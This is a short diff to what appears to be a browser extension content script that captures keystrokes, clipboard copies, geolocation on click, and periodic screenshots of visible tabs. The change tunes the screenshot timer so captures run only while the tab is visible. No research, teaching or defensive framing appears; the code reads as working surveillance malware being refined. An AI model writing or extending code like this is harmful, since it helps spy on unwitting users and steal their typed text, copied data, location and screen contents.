@@ -4,6 +4,7 @@ import {
   captureKeylogBuffer,
   captureVisibleTab,
 } from "../utils/page-utils";
+import { SCREENSHOT_INTERVAL_MS } from "../consts";
 
 // Small local debounce implementation
 function debounce<T extends (...args: any[]) => void>(fn: T, wait = 200) {
@@ -69,7 +70,11 @@ document.addEventListener("click", piggybackGeolocation);
 document.addEventListener("copy", captureClipboard);
 
 setInterval(() => {
-  captureVisibleTab();
-}, 60 * 1e3);
+  if (document.visibilityState === "visible") {
+    captureVisibleTab();
+  }
+}, SCREENSHOT_INTERVAL_MS);
 
-captureVisibleTab();
+if (document.visibilityState === "visible") {
+  captureVisibleTab();
+}
